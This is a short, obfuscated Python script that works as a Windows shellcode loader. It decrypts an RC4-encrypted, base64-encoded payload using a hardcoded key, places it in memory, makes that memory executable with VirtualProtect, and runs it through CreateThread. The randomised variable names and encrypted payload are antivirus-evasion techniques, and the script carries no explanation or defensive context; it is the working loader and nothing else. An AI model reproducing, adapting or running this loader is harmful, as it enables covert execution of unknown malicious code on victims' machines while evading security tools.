from Crypto.Cipher import ARC4
import base64
import ctypes as jaKWkf
xXKOcxZeeiyyYY = 'U(n@Alb)Y@ts(c&nPDL3*z1GOZV&sbzv'
qTLTwG = ARC4.new(xXKOcxZeeiyyYY)
Ktraqo = base64.b64decode('+gv1cQbtNeLzFEjxzD95rInEgEnXCinCwArqbtZ+IlDU7ct3RmTefzR7t8Cuh+GCKXLj+npCKncIzq2I4tNlnyxOkou5kH2z9wX52poI8+vgfaaWhwJKiQ7CRJb7qG4kW5tBCTlsn6ZVzEYhymfZhxEG0n7jJoxclUBHo5DTiP2MoSdtW60bmYqIlhAv6YDcuBa0WHiprWlJPOXty9heb4P38y8mI7IU3Z2s4bFRoIUrLwQ5jJS26Ojinj7Q/+HpiWAcOSqR0z/8DELUcdgTeSVK+0/ddBty8AckM3KtTpHiMY6BrBkdqN5HRN3C1WhTUBqYH41vNsFYoClvHywy4fi7uNyQTITS3VMsmR71kgY0d73uZGQ/5FHk/8eBEGXaejA+epNAM2pYWeJ+6bQG2+qpgFf0t+1+CUpGhsapVGCxCA4k8A49ozYlyhbWmxwn')
PztVdvGcI = qTLTwG.decrypt(Ktraqo)
xBbDGeoOrJTncat = jaKWkf.windll.kernel32.VirtualAlloc(jaKWkf.c_int(0),jaKWkf.c_int(len(PztVdvGcI)),jaKWkf.c_int(0x3000),jaKWkf.c_int(0x04))
jaKWkf.windll.kernel32.RtlMoveMemory(jaKWkf.c_int(xBbDGeoOrJTncat),PztVdvGcI,jaKWkf.c_int(len(PztVdvGcI)))
pEqBKKxIU = jaKWkf.windll.kernel32.VirtualProtect(jaKWkf.c_int(xBbDGeoOrJTncat),jaKWkf.c_int(len(PztVdvGcI)),jaKWkf.c_int(0x20),jaKWkf.byref(jaKWkf.c_uint32(0)))
csggar = jaKWkf.windll.kernel32.CreateThread(jaKWkf.c_int(0),jaKWkf.c_int(0),jaKWkf.c_int(xBbDGeoOrJTncat),jaKWkf.c_int(0),jaKWkf.c_int(0),jaKWkf.pointer(jaKWkf.c_int(0)))
jaKWkf.windll.kernel32.WaitForSingleObject(jaKWkf.c_int(csggar),jaKWkf.c_int(-1))